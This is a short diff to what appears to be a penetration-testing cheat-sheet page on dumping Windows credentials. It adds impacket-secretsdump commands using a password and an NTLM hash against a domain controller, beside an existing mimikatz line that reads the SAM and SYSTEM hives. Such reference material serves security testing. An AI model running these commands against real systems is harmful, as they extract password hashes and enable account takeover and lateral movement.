@@ -108,7 +108,13 @@ mimikatz -- '"lsadump::sam /system:C:\SYSTEM /sam:C:\SAM"'
 {{< tabcontent set3 tab1 >}}
 
 ```console
+# Password
 impacket-secretsdump '<USER>:<PASSWORD>@<TARGET>'
+```
+
+```console
+# NTLM
+sudo ntpdate -s <DC_IP> && impacket-secretsdump '<DOMAIN>/<USER>@<DC>' -hashes ':<HASH>' -k
 ```
 
 {{< /tabcontent >}}
